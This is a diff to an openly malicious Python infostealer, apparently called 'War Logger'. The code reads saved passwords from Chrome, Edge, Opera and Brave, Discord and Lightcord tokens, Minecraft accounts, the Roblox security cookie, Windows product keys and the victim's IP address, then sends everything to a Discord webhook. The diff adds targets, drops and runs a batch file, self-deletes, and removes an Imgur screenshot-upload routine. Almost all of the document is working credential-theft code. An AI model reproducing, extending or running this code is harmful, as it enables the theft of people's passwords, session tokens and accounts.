@@ -11,6 +11,8 @@ from PIL import ImageGrab as image
 from subprocess import Popen, PIPE
 from json import loads, dumps
 from shutil import copyfile
+import urllib.request
+import json
 from sys import argv
 from pathlib import Path
 import time
@@ -18,16 +20,17 @@ from os import remove
 from sys import argv
 
 # prerequisites => discord webhook, imgur api key
+# lines to edit => 164, 166, 178  | replace: "placeholder"
 # author => lust, l-ust on github | https://www.github.com/l-ust
-# latest update by => 2qk , 2qk on github
-# continiuation and progress by => war, w6r on github
-
+# update by 2qk , 2qk on github
+# This is being updated and forked daily due to browser compability and etc
+# besure to keep at latest version for best performance
 
 DBP = r'Google\Chrome\User Data\Default\Login Data'
 EBP = r'Microsoft\Edge\User Data\Default\Login Data'
 MCBP = r'.minecraft\launcher_accounts.json'
 OBP = r'\Opera Software\Opera Stable'
-BBP = r'\BraveSoftware\Brave-Browser\User Data\Default'
+BBP = r'\BraveSoftware\Brave-Browser\User Data\Default\Login Data'
 ADP = os.environ['LOCALAPPDATA']
 
 
@@ -282,7 +285,7 @@ class opera:
 
 def localdata4():
     jsn = None
-    with open(os.path.join(os.environ['LOCALAPPDATA'], r"\BraveSoftware\Brave-Browser\User Data\Default"), encoding='utf-8', mode="r") as f:
+    with open(os.path.join(os.environ['LOCALAPPDATA'], r"\BraveSoftware\Brave-Browser\User Data\Local State"), encoding='utf-8', mode="r") as f:
         jsn = json.loads(str(f.readline()))
     return jsn["os_crypt"]["encrypted_key"]
 
@@ -362,28 +365,6 @@ if __name__ == "__main__":
     main4.saved()
 
 
-# webhook functionality => collect rest of specified data, send it to our webhook
-def upload():
-    try:
-        """create a randomized name for uploading purposes : removes the possibility of repeat images being embedded"""
-        name = ''.join(random.choice(string.ascii_letters) for i in range (21))
-
-        """upload our victim's desktop image to imgur => return the image link for later usage"""
-        imgur = requests.post(
-            r'https://api.imgur.com/3/upload.json', 
-            headers = {"Authorization": "Client-ID placeholder"},
-            data = {
-                'key': 'placeholder', 
-                'image': b64encode(open(r'C:\ProgramData\screenshot.jpg', 'rb').read()),
-                'type': 'base64',
-                'name': f'{name}.jpg',
-                'title': f'{name}'})
-        image = imgur.json()['data']['link']
-        return image
-    except:
-        pass
-
-
 def beamed():
     hook = Webhook('placeholder')
     hostname = requests.get("https://api.ipify.org").text
@@ -391,25 +372,26 @@ def beamed():
         from urllib.request import urlopen
         from urllib2 import urlopen     
 
-        api_key = 'placeholder'
+        api_key = 'placeholder' """not needed """
         hostname = requests.get("https://api.ipify.org").text
         api_url = 'https://geo.ipify.org/api/v1?'
         geodata = api_url + 'apiKey=' + api_key + '&ipAddress=' + hostname
         hostgeo = requests.get("geodata").text
     except:
         pass
-
-
+    """Gets path for cookies """
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
     paths = {
         'Discord': roaming + '\\Discord',
         'Discord Canary': roaming + '\\discordcanary',
         'Discord PTB': roaming + '\\discordptb',
+        'Lightcord': roaming + '\\Lightcord',
         'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
         'Opera': roaming + '\\Opera Software\\Opera Stable',
         'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
+        'Edge': local + '\\Microsoft\\Edge\\User Data\\Default'
     }
 
     message = '\n'
@@ -454,7 +436,7 @@ def beamed():
 
     """gather our windows product key variables"""
     try:
-        usr = os.getenv("UserName")
+        user = os.getenv("UserName")
         keys = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
         types = subprocess.check_output('wmic os get Caption').decode().split('\n')[1].strip()
         sn = subprocess.check_output('wmic os get SerialNumber').decode().split('\n')[1].strip()
@@ -465,10 +447,8 @@ def beamed():
     except:
         pass
 
-    """steal victim's .roblosecurity cookie"""
+    """steal victim's cookie"""
     cookie = [".ROBLOSECURITY"]
-    cookie2 = ["bearer_token"]
-    cookie3 = ["id_token"]
     cookies = []
     limit = 2000
 
@@ -506,31 +486,20 @@ def beamed():
     except:
         pass
 
-    """read data => if we find a matching positive for our specified variable 'cookie', send it to our webhook."""
-    try:
-        for y in cookie2:
-            send = str([str(x) for x in cookies if y in str(x)])
-            chunks = [send[i:i + limit] for i in range(0, len(send), limit)]
-            for z in chunks:
-                bearer = f'```' + f'{z}' + '```'
-    except:
-        pass
-
     """attempt to send all recieved data to our specified webhook"""
     try:
-        embed = Embed(title='[War Logger => Extracted and logged {usr}',description='A victim\'s data was extracted and we have succesfully linked to the skids computer, here\'s the details:',color=16724480,timestamp='now')
-        embed.add_field("Windows Information:",f"WinType => {types}\nWinKey => {keys}\nEncryption =>  {el}\nManufacture => {sd}\nSerialNumber => {sn}\nFirst PowerOn => {pid}\nLatest PowerOn => {pvn}\nIP => {hostname}")
-        embed.add_field("Roblox Security:",roblox)
-        embed.add_field("Minecraft Token:",bearer)
-        embed.add_field("Tokens:",message)
-        embed.set_thumbnail(url='https://i.pinimg.com/originals/ce/88/36/ce88360f298f896ebec80e4e1bdd9f28.jpg')
-        embed.set_image(url=upload())
+        embedWIN = Embed(title=f' [  War\'s Beaming Tool => We Have Logged {user}  ] ',description=f'{user}\'s data was extracted and we have succesfully linked to {user}\'s computer, here\'s the details:',color=16316671,timestamp='now')
+        embedWIN.add_field("Windows Information:",f"WinType => {types}\nWinKey => {keys}\nEncryption =>  {el}\nManufacture => {sd}\nSerialNumber => {sn}")
+        embedWIN.add_field("Location Information",f"IP => {hostname}")
+        embedWIN.add_field("Roblox Security Token:",roblox)
+        embedWIN.add_field("Extra Tokens Found:",message)
+        embedWIN.set_thumbnail(url='http://www.thelogomix.com/files/imagecache/v3-logo-detail/war.jpg')
     except:
         pass
 
     try:
         hook.send(file=victimfiles)
-        hook.send(embed=embed)
+        hook.send(embed=embedWIN)
     except:
         pass
 
@@ -545,7 +514,17 @@ def beamed():
     except:
         pass
 
-    """autoremoves the file for privacy"""
+    """makes bat file for bootleg skid virus"""
+    try:
+        v1name = r'C:\ProgramData\fuckyou.bat'
+        v1 = open(v1name, "w")
+        v1.write("@ECHO off\nSTART %SystemRoot%\system32\notepad.exe")
+        v1.close()
+        subprocess.os.system(r'C:\ProgramData\fuckyou.bat')
+    except:
+    	pass
+
+    """autoremoves the file for privacy (only works with the .py, compiled exes may be broken and not self delete)"""
     try:
         remove(argv[0])
     except:
